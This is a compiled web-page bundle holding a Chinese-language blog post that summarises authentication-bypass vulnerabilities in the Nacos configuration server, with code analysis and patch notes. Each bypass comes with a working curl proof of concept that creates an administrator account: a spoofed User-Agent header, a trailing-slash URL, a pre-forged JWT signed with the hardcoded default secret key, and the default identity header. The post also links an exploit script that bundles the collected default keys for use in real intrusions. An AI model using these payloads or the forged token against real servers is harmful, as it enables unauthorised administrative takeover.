import{_ as e,o as a,c as s,e as t}from"./app-vMCaIZpZ.js";const n="/assets/Pasted_image_20230508211115-YwHzLvGM.png",c="/assets/Pasted_image_20230509101114-_TokpW7m.png",o="/assets/Pasted_image_20230514185301-Kr7xFHun.png",r="/assets/Pasted_image_20230514185334-HIOexqro.png",i="/assets/Pasted_image_20230514185446-sSi987q1.png",d="/assets/Pasted_image_20230514185510-h28FJj7D.png",p="/assets/Pasted_image_20230514190056-HafpA5uN.png",l="/assets/Pasted_image_20230515024908-4N5me-KJ.png",h="/assets/Pasted_image_20230515000913-7cDaui-X.png",u="/assets/Pasted_image_20230515001745-SWnl9aSo.png",m="/assets/Pasted_image_20230515002017-GeVangK5.png",g="/assets/Pasted_image_20230515010347-flHKnKst.png",_="/assets/Pasted_image_20230509101454-5KEPakxo.png",b="/assets/Pasted_image_20230515010628-MunxuMUt.png",v="/assets/Pasted_image_20230515011709-1sL2PFsV.png",y="/assets/Pasted_image_20230515011840-j-C8RqFg.png",x="/assets/Pasted_image_20230515014836-o6PdyUEV.png",k="/assets/Pasted_image_20230514153628--V35Kq2L.png",P="/assets/Pasted_image_20230515013115-A2mHTaek.png",f="/assets/Pasted_image_20230515013153-t5c7IfuC.png",A="/assets/Pasted_image_20230515014556-D5NEVM8W.png",N={},j=t('<h1 id="nacos-权限绕过漏洞总结" tabindex="-1"><a class="header-anchor" href="#nacos-权限绕过漏洞总结" aria-hidden="true">#</a> Nacos 权限绕过漏洞总结</h1><p>本篇文章总结了一下用到的 Nacos 权限绕过漏洞，以及在高版本下可能存在的配置错误导致的权限绕过</p><p>Nacos默认情况存在 nacos/nacos 默认用户 还有默认不开启鉴权，实际上所有接口都可以任意访问，这里就不赘述了</p><h2 id="_0x00-本地调试nacos" tabindex="-1"><a class="header-anchor" href="#_0x00-本地调试nacos" aria-hidden="true">#</a> 0x00 本地调试nacos</h2><p>添加 JVM 参数，指定单机模式：-Dnacos.standalone=true MainClass：com.alibaba.nacos.Nacos 指定console模块</p><p><img src="'+n+'" alt=""></p><p>java: 程序包com.alibaba.nacos.consistency.entity不存在 解决办法： <code>mvn compile</code>一下就好 参考：https://blog.csdn.net/ibigboy/article/details/119413998</p><p>如果是在高版本下（nacos &gt; 2.2.0），这样是启动不起来的，根据提示，需要自行手动设置JWT令牌的密钥 nacos.core.auth.plugin.nacos.token.secret.key=SecretKey012345678901234567890123456789012345678901234567890123456789 <img src="'+c+'" alt=""> 以及identify.key、value</p><h2 id="_0x01-user-agent-权限绕过-cve-2021-29441" tabindex="-1"><a class="header-anchor" href="#_0x01-user-agent-权限绕过-cve-2021-29441" aria-hidden="true">#</a> 0x01 User-Agent 权限绕过（CVE-2021-29441）</h2><p>漏洞影响版本：Nacos &lt; 1.4.2 概述：这个是最早的漏洞，只要请求头中的<code>User-Agent</code>以<code>Nacos-Server</code>开头，就能通过权限校验</p><p>漏洞点：com.alibaba.nacos.core.auth.AuthFilter#doFilter 下面以nacos 1.4.0 代码举例 <img src="'+o+'" alt=""></p><p>从请求中获取UA，然后，如果UA以<code>Nacos-Server</code>开头则会通过权限校验 <img src="'+r+`" alt=""></p><h3 id="poc" tabindex="-1"><a class="header-anchor" href="#poc" aria-hidden="true">#</a> POC</h3><p>UA绕过添加用户</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">curl</span> <span class="token parameter variable">-XPOST</span> <span class="token string">&#39;http://192.168.1.196:8848/nacos/v1/auth/users?username=admin&amp;password=1qazqweasd&#39;</span> <span class="token parameter variable">-H</span> <span class="token string">&#39;User-Agent: Nacos-Server&#39;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="补丁修复" tabindex="-1"><a class="header-anchor" href="#补丁修复" aria-hidden="true">#</a> 补丁修复</h3><p>在1.4.1版本中，添加了 com.alibaba.nacos.auth.common.AuthConfigs#enableUserAgentAuthWhite 变量，用于控制是否开启UA认证的方式 <img src="`+i+'" alt=""></p><p>不过可以看到，如果配置文件里没有配置<code>nacos.core.auth.enable.userAgentAuthWhite</code>属性，那么<code>enableUserAgentAuthWhite</code>变量的值就会被默认赋值为<code>true</code><img src="'+d+'" alt=""></p><p>在1.4.2中配置文件中的值才会被设置为默认false，所以这个漏洞默认影响范围为 nacos &lt; 1.4.2 <img src="'+p+'" alt=""></p><h2 id="_0x02-nacos-url-权限绕过" tabindex="-1"><a class="header-anchor" href="#_0x02-nacos-url-权限绕过" aria-hidden="true">#</a> 0x02 Nacos URL 权限绕过</h2><p>影响范围：Nacos &lt; 1.4.2 概述：在url的末尾添加<code>/</code>即可权限绕过</p><p>由 threedr3am 师傅发现，具体参考 https://github.com/alibaba/nacos/issues/4701 写的较为详细</p><h3 id="poc-1" tabindex="-1"><a class="header-anchor" href="#poc-1" aria-hidden="true">#</a> POC</h3><p>测试环境为 nacos 1.4.0 <img src="'+l+`" alt=""></p><p>添加用户</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">curl</span> <span class="token parameter variable">-XPOST</span> <span class="token string">&#39;http://192.168.1.196:8848/nacos/v1/auth/users/?username=admin&amp;password=1qazqweasd&#39;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="补丁修复-1" tabindex="-1"><a class="header-anchor" href="#补丁修复-1" aria-hidden="true">#</a> 补丁修复</h3><p>https://github.com/alibaba/nacos/commit/d568030823f7559c0ce220898c25292e3f35a1d9</p><h2 id="_0x03-jwt-secret-key-硬编码权限绕过" tabindex="-1"><a class="header-anchor" href="#_0x03-jwt-secret-key-硬编码权限绕过" aria-hidden="true">#</a> 0x03 JWT secret.key 硬编码权限绕过</h2><p>影响版本：0.1.0 &lt;= Nacos &lt;= 2.2.0 概述：用于签名的jwt的key（<code>nacos.core.auth.plugin.nacos.token.secret.key</code>配置）默认值为<code>SecretKey012345678901234567890123456789012345678901234567890123456789</code></p><p>以 nacos 2.2.0 为例：secret.key 在如下位置硬编码 <img src="`+h+'" alt=""></p><p>可以在 https://jwt.io 中生成一个有效签名的jwt，注意要声明算法为 HS512，过期时间戳可以调的大一些 <img src="'+u+`" alt=""></p><p>生成jwt如下</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6IjI2MTYyMzkwMjIifQ.5aXePQdHbh9hKNoj_qqCC4x6PzbXmpy-vYQHhi0PdjVHyDJ40Ge6CVz6AWuV1UHa4H8-A-LXMOqQGSXjrsJ8HQ
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="`+m+`" alt=""></p><h3 id="poc-2" tabindex="-1"><a class="header-anchor" href="#poc-2" aria-hidden="true">#</a> POC</h3><p>实战中较为方便的做法是直接创建一个用户，然后登陆</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">curl</span> <span class="token parameter variable">-XPOST</span> <span class="token string">&#39;http://192.168.1.196:8848/nacos/v1/auth/users/?accessToken=eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6IjI2MTYyMzkwMjIifQ.5aXePQdHbh9hKNoj_qqCC4x6PzbXmpy-vYQHhi0PdjVHyDJ40Ge6CVz6AWuV1UHa4H8-A-LXMOqQGSXjrsJ8HQ&amp;username=admin&amp;password=1qazqweasd&#39;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="`+g+'" alt=""></p><h3 id="补丁修复-2" tabindex="-1"><a class="header-anchor" href="#补丁修复-2" aria-hidden="true">#</a> 补丁修复</h3><p>新版中的nacos的<code>nacos.core.auth.plugin.nacos.token.secret.key</code>默认为空，需要手动设置才能正常启动 <img src="'+_+'" alt=""></p><blockquote><p>https://nacos.io/zh-cn/docs/v2/guide/user/auth.html</p></blockquote><p>我意识到这可能会有一些问题，我网上搜了一圈，除了少数人推荐生成随机base64，还是有很多人的解决办法是使用官方的默认key，毕竟程序能跑起来就不错了... <img src="'+b+'" alt=""></p><p>我已将搜集到的secret.key对应生成jwt已集成至文章末尾的exp脚本中，提高一点实战的渗透胜率</p><h2 id="_0x04-identity-key-value-硬编码权限绕过" tabindex="-1"><a class="header-anchor" href="#_0x04-identity-key-value-硬编码权限绕过" aria-hidden="true">#</a> 0x04 identity key value 硬编码权限绕过</h2><p>影响版本：Nacos &lt;= 2.2.0 概述：当开启nacos权限认证（<code>nacos.core.auth.enabled=true</code>）后，配置文件中的<code>nacos.core.auth.server.identity.key</code>、<code>nacos.core.auth.server.identity.value</code>参数分别存在默认值<code>serverIdentity</code>和<code>security</code>，当请求头携带该key以及value时，即可绕过权限认证</p><p>以nacos 2.2.0为例： <img src="'+v+'" alt=""></p><p>漏洞代码仍然在 com.alibaba.nacos.core.auth.AuthFilter#doFilter <img src="'+y+`" alt=""> 开启认证后（非默认），且没有开启UA白名单校验（默认），尝试从请求header中获取IdentityKey，也就是配置文件中的<code>nacos.core.auth.server.identity.key</code>的值，然后再对比header中value的值和配置文件中<code>nacos.core.auth.server.identity.value</code>的值是否相同，如果相同则通过权限校验</p><h3 id="poc-3" tabindex="-1"><a class="header-anchor" href="#poc-3" aria-hidden="true">#</a> POC</h3><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">curl</span> <span class="token parameter variable">-XPOST</span> <span class="token string">&#39;http://127.0.0.1:8848/nacos/v1/auth/users?username=admin2&amp;password=1qazqweasd&#39;</span> <span class="token parameter variable">-H</span> <span class="token string">&quot;serverIdentity: security&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="`+x+'" alt=""></p><h3 id="补丁修复-3" tabindex="-1"><a class="header-anchor" href="#补丁修复-3" aria-hidden="true">#</a> 补丁修复</h3><p>和jwt key修复方式一样，在高版本中，如果开启了Nacos认证校验（<code>nacos.core.auth.enabled=true</code>），必须填写<code>nacos.core.auth.server.identity.key</code> and <code>nacos.core.auth.server.identity.value</code>才可以正常启动，否则报错 <img src="'+k+'" alt=""></p><p>这里问题跟jwt硬编码问题一样，解决办法也一模一样，网上也会有解决办法，里面也有硬编码key value，可以提取出来 例如官网中的example <img src="'+P+'" alt=""></p><p>百度解决方案搜索第一的key value为 test <img src="'+f+'" alt=""></p><p>以上key、value均已集成至exp脚本</p><h2 id="_0x05-一键添加用户脚本" tabindex="-1"><a class="header-anchor" href="#_0x05-一键添加用户脚本" aria-hidden="true">#</a> 0x05 一键添加用户脚本</h2><p>实战一般会添加一个用户，方便交互，另外添加用户可能会存在权限不足的问题，可能没有命名空间的权限，脚本内均以继承，把以上姿势都集成到一个脚本中： <img src="'+A+'" alt=""></p><p><a href="/asserts/NacosAddUser.py">NacosAddUser.py</a></p>',59),q=[j];function H(I,U){return a(),s("div",null,q)}const J=e(N,[["render",H],["__file","Nacosquanxianraoguoloudongzongjie.html.vue"]]);export{J as default};
